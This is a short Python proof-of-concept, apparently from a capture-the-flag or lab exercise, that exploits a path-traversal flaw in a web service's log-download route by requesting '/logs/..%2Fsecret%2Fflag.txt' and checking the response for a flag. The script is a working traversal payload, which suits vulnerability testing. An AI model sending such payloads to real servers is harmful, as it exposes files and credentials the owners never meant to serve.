#!/usr/bin/env python3
"""
PoC #1: Path-traversal log download -> flag disclosure
------------------------------------------------------
GET /logs/{name} joins the requested name to the logs root with no
canonicalisation or containment check (Main.routes, the `GET -> "logs" /: rest`
case: `Config.logsRoot.resolve(name)`). A name containing `..` escapes the logs
directory. The rotating secret lives one level up at secret/flag.txt, so
`..%2Fsecret%2Fflag.txt` reads the flag straight out over HTTP.

Verification is over HTTP only: request the traversal path and confirm the
response body looks like the flag (a `FLAG{...}` marker).

Run LOG first, then:  python3 01_path_traversal.py [host] [port]
"""
import re
import sys
import urllib.error
import urllib.request

HOST = sys.argv[1] if len(sys.argv) > 1 else "127.0.0.1"
PORT = int(sys.argv[2]) if len(sys.argv) > 2 else 8080
BASE = f"http://{HOST}:{PORT}"


def get_raw(path):
    # Build the URL by hand so the encoded %2F traversal is sent verbatim.
    req = urllib.request.Request(f"{BASE}{path}", method="GET")
    try:
        with urllib.request.urlopen(req, timeout=15) as r:
            return r.status, r.read()
    except urllib.error.HTTPError as e:
        return e.code, e.read()


def main():
    # secret/flag.txt sits one directory above the logs root.
    traversal = "/logs/..%2Fsecret%2Fflag.txt"
    print(f"[*] Requesting {traversal}")
    status, body = get_raw(traversal)
    text = body.decode(errors="replace")
    print(f"[*] -> {status} {text[:120]!r}")

    m = re.search(r"FLAG\{[^}]*\}", text)
    if status == 200 and m:
        print(f"[+] Path traversal confirmed - disclosed the flag: {m.group(0)}")
    else:
        print("[-] Did not disclose the flag (traversal may be patched).")
        sys.exit(1)


if __name__ == "__main__":
    main()
